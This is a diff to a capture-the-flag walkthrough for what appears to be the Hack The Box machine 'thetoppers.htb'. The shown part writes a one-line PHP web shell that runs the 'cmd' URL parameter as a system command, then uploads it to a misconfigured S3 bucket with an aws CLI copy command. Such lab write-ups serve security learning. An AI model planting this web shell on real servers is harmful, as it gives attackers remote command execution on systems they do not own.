@@ -202,9 +202,17 @@ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 
 -> `awscli` can use `cp` to copy files to remote bucket, so we can upload a **PHP shell**
 
-php payload:
+PHP payload:
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
-use
+use `system()` func, which takes URL parameter `cmd` as input and execs it as system command
+
+upload time!
+```bash
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+```
+
+now it takes we can use `cmd` as parameter and pass in the input command like `id`
+
